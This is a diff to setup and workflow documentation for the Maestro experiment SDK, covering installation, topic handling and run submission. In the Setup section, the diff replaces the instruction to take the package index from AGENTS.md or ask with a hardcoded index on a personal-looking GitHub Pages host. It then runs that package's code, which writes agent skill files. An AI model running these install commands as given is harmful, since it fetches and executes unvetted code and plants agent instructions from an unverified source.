@@ -9,14 +9,16 @@ Maestro runs Harbor experiments for a team. You reach it over HTTP with a PAT; y
 
 ## Setup
 
+For an existing tool project, start the development agent in the project root. Install the SDK in a separate Python 3.10+ environment and copy its two skills into the project. Run the following from the project root, substituting the installed service version:
+
 ```bash
-# Python >= 3.10; depends only on httpx and pydantic. Use the service's version.
-uv pip install "maestro-sdk==<version>" --index maestro=<index>      # index from AGENTS.md
-python -c "import maestro_sdk.skills as s; s.install()"   # these skills, matching that SDK
+export MAESTRO_PYTHON="$HOME/.local/share/maestro-tools/bin/python"
+uv venv "${MAESTRO_PYTHON%/bin/python}"
+uv pip install --python "$MAESTRO_PYTHON" "maestro-sdk==<version>" --index maestro=https://au12321ua.github.io/maestro/simple
+"$MAESTRO_PYTHON" -c 'from maestro_sdk.skills import install; install(".")'
 ```
 
-- Take the index and version from the workspace's `AGENTS.md` or ask.
-- `maestro_sdk.workspace.init(dir)` sets up a whole workspace (see the `maestro-package` skill).
+For an unreleased service build, install its accompanying SDK wheel with `uv pip install --python "$MAESTRO_PYTHON" --reinstall-package maestro-sdk <wheel>`. After each SDK update repeat the install call. It writes to `.agents/skills/` and `.claude/skills/`; pass e.g. `targets=[".agents/skills"]` to select one. Use `"$MAESTRO_PYTHON"` for SDK calls and provide its path to the project agent along with `MAESTRO_URL` and `MAESTRO_TOKEN_FILE` in the local environment. This works for non-Python projects too. For a separate experiment workspace, use `maestro_sdk.workspace.init(dir)`.
 
 ```python
 from maestro_sdk import MaestroClient
@@ -29,7 +31,7 @@ client = MaestroClient.from_env()      # MAESTRO_URL plus MAESTRO_TOKEN or MAEST
 
 ## Workflow
 
-When given an experiment topic link, read [references/topics.md](references/topics.md). Read the topic overview and latest handoff before planning another run. Carry the same topic handle through submission, and share its link when handing the work over.
+Before the first baseline, candidate series or handoff, look for a topic link in the task or the project's existing notes. Open its overview, latest handoff and active runs. With only a name, search and compare purposes; ask when several fit. Without a link, find a topic for this question or suggest creating one with a clear purpose. Keep its URL in the project's usual task or handoff record. A one-off run can be submitted directly and added later if the work grows. See [topic selection and handoff](references/topics.md).
 
 1. **Check the service.** Run `client.require("runs", "execution")`; it raises `UnsupportedCapability` when a feature is off. Read `caps.limits` for team limits. A `ContractDriftWarning` means the SDK and service versions differ; tell the user.
 2. **Find inputs.**
@@ -41,7 +43,7 @@ When given an experiment topic link, read [references/topics.md](references/topi
    - `.raise_for_blockers()` raises `BlockersPresent` listing code, path and message for each blocker.
    - Fix the fields the blockers point at. Do not work around team limits.
 4. **Confirm cost.** `execution_mode: "agent"` calls a real model through a team credential and spends money. Say how many trials it plans (`resolution.planned_trials`) and get the user's go-ahead unless they already authorised this scale. `"oracle"` runs each task's reference solution; it is a test mode, free of model cost, and never a model result.
-5. **Submit once.** Run `client.runs.submit(name=..., resolution_id=resolution.resolution_id, client_request_id="<something you will remember>")`, and keep `submitted.idempotency_key` and `submitted.run_id`.
+5. **Submit once.** For the chosen topic use `topic.runs.submit(name=..., resolution_id=resolution.resolution_id, client_request_id="<something you will remember>")`, and keep `submitted.idempotency_key` and `submitted.run_id`. Use `client.runs.submit` for a standalone trial.
 6. **Wait.** Run `client.operations.wait(submitted.operation_id, timeout=...)`. A `WaitTimeout` only stops your waiting, and the run continues. To stop the run itself, call `client.runs.cancel(run_id)`, but only when asked.
 7. **Read results.**
    - The run: `client.runs.get(run_id)`, `client.runs.summary(run_id)`, `client.runs.trials(run_id)`.
